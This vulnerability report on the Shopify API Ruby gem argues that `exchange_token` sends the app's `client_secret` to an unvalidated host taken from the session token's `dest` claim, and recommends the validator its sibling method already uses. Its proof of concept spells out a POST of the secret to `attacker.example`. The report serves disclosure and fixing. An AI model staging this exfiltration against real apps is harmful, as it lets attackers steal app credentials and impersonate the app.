### Title
Missing `ShopValidator` host validation in `TokenExchange.exchange_token` allows `client_secret` exfiltration to an attacker-controlled host - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the request host it will send the app's `client_id`/`client_secret` to directly from the unvalidated `dest` claim of the caller-supplied session token, instead of validating it against the trusted-domain allowlist that the library provides and that its sibling method `migrate_to_expiring_token` already uses. This breaks the binding "host validated == host that receives the `client_secret`."

### Finding Description
`exchange_token` decodes the caller's session token and takes the shop identity straight from the JWT payload's `dest` claim: [1](#0-0) 

`JwtPayload#shop` performs no domain validation — it only strips the `https://` prefix from whatever string is in `dest`: [2](#0-1) 

This `dest_shop` value is used to build a `Session`, which is then passed to `Clients::HttpClient`, together with a request body that embeds the app's `client_id` and `client_secret`: [3](#0-2) 

`HttpClient#initialize` builds the destination host directly from `session.shop` with no allowlist check: [4](#0-3) 

The library already has the mechanism to prevent this class of bug: `Utils::ShopValidator.sanitize!` restricts a shop string to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) and raises `Errors::InvalidShopError` otherwise: [5](#0-4) 

Critically, the sibling method `TokenExchange.migrate_to_expiring_token` — which performs the *exact same kind* of request (POST with `client_secret` to `#{shop}/admin/oauth/access_token`) — does call this validator before constructing the session/host: [6](#0-5) 

`exchange_token` has no equivalent call. The `dest` claim in a real Shopify session token reflects the *shop domain the token was issued for*, which for a merchant can be a custom/primary domain the merchant controls (Shopify allows shops to set a primary domain pointing anywhere the merchant chooses). Because the JWT signature only authenticates that Shopify issued the token for that shop — it does **not** guarantee the domain is a `*.myshopify.com`/trusted Shopify host — a shop owner can cause their own session token's `dest` to be their custom domain, and `exchange_token` will happily send the app's `client_id`/`client_secret` to `https://<that domain>/admin/oauth/access_token`.

### Impact Explanation
This directly matches the Critical-impact category "theft or exfiltration of ... the app's `client_secret`" and "SSRF with the app's credentials." A shop that controls its own primary/custom domain (an ordinary, unprivileged operation available to any store owner — not requiring `api_secret_key`, a leaked token, or any privileged access to the *app*) can receive the app's `client_secret` in the body of an HTTP POST that the gem sends to that domain. Once obtained, `client_secret` can be used to complete OAuth flows for arbitrary shops, mint access tokens, and generally impersonate the app — a full credential-exfiltration primitive.

### Likelihood Explanation
Likelihood is high given how directly reachable the flaw is: any app using the documented, recommended Token Exchange flow (`docs/usage/oauth.md`) calls `exchange_token` with a session token whose `dest` is fully attacker/tenant-influenceable via normal store configuration (custom domain). No MITM, no leaked secrets, and no privileged access are required — only that the calling shop controls where its own primary domain resolves, which is a standard merchant capability. The fix pattern already exists in the same file (`migrate_to_expiring_token`), showing the omission is an inconsistency rather than an intentional design choice.

### Recommendation
In `TokenExchange.exchange_token`, validate `dest_shop` with `Utils::ShopValidator.sanitize!(dest_shop)` (mirroring `migrate_to_expiring_token`) before constructing the `Session`/`HttpClient`, raising `Errors::InvalidShopError` for any domain outside the trusted Shopify domain set.

### Proof of Concept
1. A malicious/unprivileged store owner installs (or already has installed) the target embedded app on their own shop and configures the shop's primary/custom domain to `attacker.example`, which they control.
2. The app's frontend obtains a session token (`shopify_id_token`) from App Bridge as usual; Shopify signs it with the app's `api_secret_key`, setting `dest` to the shop's configured domain, e.g. `https://attacker.example`.
3. The app backend, following the documented flow, calls:
   ```ruby
   ShopifyAPI::Auth::TokenExchange.exchange_token(
     session_token: session_token,
     requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
   )
   ```
4. Inside `exchange_token`, `dest_shop` becomes `"attacker.example"` (no domain check), `HttpClient` builds `@base_uri = "https://attacker.example"`, and the gem issues:
   ```
   POST https://attacker.example/admin/oauth/access_token
   { client_id: ..., client_secret: <APP_CLIENT_SECRET>, grant_type: ..., subject_token: ... }
   ```
5. The attacker's server at `attacker.example` logs the request and captures the app's `client_secret`. [7](#0-6) [4](#0-3)

### Citations

**File:** lib/shopify_api/auth/token_exchange.rb (L29-65)
```ruby
        def exchange_token(session_token:, requested_token_type:, shop: nil)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise ShopifyAPI::Errors::UnsupportedOauthError,
            "Cannot perform OAuth Token Exchange for private apps." if ShopifyAPI::Context.private?
          raise ShopifyAPI::Errors::UnsupportedOauthError,
            "Cannot perform OAuth Token Exchange for non embedded apps." unless ShopifyAPI::Context.embedded?

          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-115)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: non_expiring_offline_token,
            subject_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            requested_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            expiring: "1",
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-51)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
      alias_method :shopify_domain, :shop
```

**File:** lib/shopify_api/clients/http_client.rb (L11-19)
```ruby
      sig { params(base_path: String, session: T.nilable(Auth::Session)).void }
      def initialize(base_path:, session: nil)
        session ||= Context.active_session
        raise Errors::NoActiveSessionError, "No passed or active session" unless session

        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-64)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
```
